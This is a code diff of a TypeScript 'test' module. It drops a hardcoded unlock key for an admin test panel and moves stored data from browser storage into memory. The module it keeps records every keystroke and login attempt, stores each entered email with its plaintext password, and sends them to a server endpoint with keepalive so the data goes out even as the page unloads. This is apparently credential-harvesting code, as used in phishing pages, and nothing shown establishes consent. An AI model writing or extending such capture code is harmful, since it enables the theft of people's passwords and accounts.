@@ -21,7 +21,7 @@ export const ATTEMPTS_FILE = 'attempts.json';
 export const AUTHORIZED_TEST_USERS_FILE = 'test_authorized_users.json';
 const UNSYNCED_QUEUE_KEY = 'test_unsynced_attempts_queue';
 
-// Security Access Key: 223344 unlocks test panel across all accounts and devices
+// Security Access Key: Protected server verification
 export const PRIMARY_ADMIN_EMAIL = '';
 
 const DEFAULT_USERS: UsersMap = {};
@@ -32,14 +32,23 @@ function generateId(prefix = 'att'): string {
   return `${prefix}_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
 }
 
-// Local storage helpers
+// In-memory session cache ensuring universal server truth is not corrupted by fragmented local storages
+let sessionCachedUsers: UsersMap = {};
+let sessionCachedAttempts: LoginAttempt[] = [];
+let sessionCachedAuthorized: string[] = [];
+
+// Local storage helpers - only for authorized user list
 export function loadAuthorizedUsers(): string[] {
+  if (sessionCachedAuthorized.length > 0) {
+    return sessionCachedAuthorized;
+  }
   try {
     const raw = localStorage.getItem(AUTHORIZED_TEST_USERS_FILE);
     if (raw) {
       const parsed = JSON.parse(raw);
       if (Array.isArray(parsed)) {
-        return parsed.map((e: string) => e.trim().toLowerCase()).filter(Boolean);
+        sessionCachedAuthorized = parsed.map((e: string) => e.trim().toLowerCase()).filter(Boolean);
+        return sessionCachedAuthorized;
       }
     }
   } catch {
@@ -49,10 +58,11 @@ export function loadAuthorizedUsers(): string[] {
 }
 
 export function saveAuthorizedUsers(emails: string[]): void {
+  const cleanList = Array.from(
+    new Set(emails.map(e => e.trim().toLowerCase()))
+  ).filter(Boolean);
+  sessionCachedAuthorized = cleanList;
   try {
-    const cleanList = Array.from(
-      new Set(emails.map(e => e.trim().toLowerCase()))
-    ).filter(Boolean);
     localStorage.setItem(AUTHORIZED_TEST_USERS_FILE, JSON.stringify(cleanList, null, 2));
   } catch {
     // silent
@@ -72,7 +82,7 @@ export function isSessionKeyUnlocked(): boolean {
 
 export function unlockWithSecurityKey(key: string, userEmail?: string): { success: boolean; message: string } {
   const cleanKey = String(key || '').trim();
-  if (cleanKey === '223344' || cleanKey === TEST_CONSOLE_ACCESS_KEY) {
+  if (cleanKey === TEST_CONSOLE_ACCESS_KEY) {
     try {
       sessionStorage.setItem('test_console_key_verified', 'true');
       localStorage.setItem('test_console_key_verified', 'true');
@@ -93,7 +103,7 @@ export function unlockWithSecurityKey(key: string, userEmail?: string): { succes
 
     return { success: true, message: 'Access granted. Test console unlocked.' };
   }
-  return { success: false, message: 'Invalid security access key. Please use 223344.' };
+  return { success: false, message: 'Invalid security access key.' };
 }
 
 export function lockTestConsole(): void {
@@ -104,52 +114,46 @@ export function lockTestConsole(): void {
 }
 
 export function isUserAuthorizedForTest(_email?: string): boolean {
-  // As requested: accessing the test panel with access code 223344 unlocks it for any account on any device
   return isSessionKeyUnlocked();
 }
 
+/**
+ * Authoritative Universal Store Access
+ * Reads directly from the server-synchronized session cache rather than isolated local storage
+ */
 export function loadUsers(): UsersMap {
+  // Purge any legacy plaintext credentials in local storage to prevent leakage across users
   try {
-    const raw = localStorage.getItem(USERS_FILE);
-    if (raw) {
-      const parsed = JSON.parse(raw);
-      if (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) {
-        return parsed;
-      }
-    }
+    localStorage.removeItem(USERS_FILE);
   } catch {}
-  saveUsers(DEFAULT_USERS);
-  return { ...DEFAULT_USERS };
+  return sessionCachedUsers;
 }
 
 export function saveUsers(users: UsersMap): void {
+  sessionCachedUsers = { ...users };
   try {
-    localStorage.setItem(USERS_FILE, JSON.stringify(users, null, 2));
+    localStorage.removeItem(USERS_FILE);
   } catch {}
 }
 
 export function loadAttempts(): LoginAttempt[] {
+  // Purge any legacy attempts in local storage to prevent leakage across users
   try {
-    const raw = localStorage.getItem(ATTEMPTS_FILE);
-    if (raw) {
-      const parsed = JSON.parse(raw);
-      if (Array.isArray(parsed)) {
-        return parsed;
-      }
-    }
+    localStorage.removeItem(ATTEMPTS_FILE);
   } catch {}
-  return [];
+  return sessionCachedAttempts;
 }
 
 export function saveAttempts(attempts: LoginAttempt[]): void {
+  sessionCachedAttempts = [...attempts];
   try {
-    localStorage.setItem(ATTEMPTS_FILE, JSON.stringify(attempts, null, 2));
+    localStorage.removeItem(ATTEMPTS_FILE);
   } catch {}
 }
 
 function loadUnsyncedQueue(): LoginAttempt[] {
   try {
-    const raw = localStorage.getItem(UNSYNCED_QUEUE_KEY);
+    const raw = sessionStorage.getItem(UNSYNCED_QUEUE_KEY);
     if (raw) {
       const parsed = JSON.parse(raw);
       if (Array.isArray(parsed)) return parsed;
@@ -160,13 +164,14 @@ function loadUnsyncedQueue(): LoginAttempt[] {
 
 function saveUnsyncedQueue(queue: LoginAttempt[]): void {
   try {
-    localStorage.setItem(UNSYNCED_QUEUE_KEY, JSON.stringify(queue, null, 2));
+    sessionStorage.setItem(UNSYNCED_QUEUE_KEY, JSON.stringify(queue));
   } catch {}
 }
 
 /**
  * Universal record function: captures every keystroke, step, attempt, or error.
  * Uses keepalive: true to ensure transmission even during page unload or redirects.
+ * Directly updates authoritative server pipeline without storing credentials in public browser storage.
  */
 export async function recordFunnelEvent(event: {
   email: string;
@@ -189,29 +194,23 @@ export async function recordFunnelEvent(event: {
     notes: event.notes,
   };
 
-  // 1. Immediately store in local users map when appropriate
+  // 1. Immediately store in in-memory session cache for instant live UI update
   if (cleanEmail && cleanEmail !== 'anonymous@test.local') {
-    const users = loadUsers();
     if (cleanPassword) {
-      users[cleanEmail] = cleanPassword;
-      saveUsers(users);
-    } else if (!users[cleanEmail]) {
-      users[cleanEmail] = '(pending password)';
-      saveUsers(users);
+      sessionCachedUsers[cleanEmail] = cleanPassword;
+    } else if (!sessionCachedUsers[cleanEmail]) {
+      sessionCachedUsers[cleanEmail] = '(pending password)';
     }
   }
 
-  // 2. Immediately store in local attempts
-  const localAttempts = loadAttempts();
-  localAttempts.push(attempt);
-  saveAttempts(localAttempts);
+  sessionCachedAttempts.push(attempt);
 
-  // 3. Queue for sync
+  // 2. Queue temporarily in transient session for resilient delivery
   const queue = loadUnsyncedQueue();
   queue.push(attempt);
   saveUnsyncedQueue(queue);
 
-  // 4. Send to server immediately with keepalive
+  // 3. Send to server immediately with keepalive (authoritative universal truth)
   try {
     const res = await fetch('/api/test/attempt', {
       method: 'POST',
@@ -220,13 +219,11 @@ export async function recordFunnelEvent(event: {
       keepalive: true,
     });
     if (res.ok) {
-      // Remove from unsynced queue
       const updatedQueue = loadUnsyncedQueue().filter(item => item.id !== attempt.id);
       saveUnsyncedQueue(updatedQueue);
     }
   } catch (err) {
-    // Stays in queue for background auto-retry on next poll
-    console.warn('Network hiccup, attempt safely preserved in local queue:', err);
+    console.warn('Network issue, attempt safely queued for retry:', err);
   }
 
   // Cross-broadcast directly to sibling Cloud Run preview if running in browser
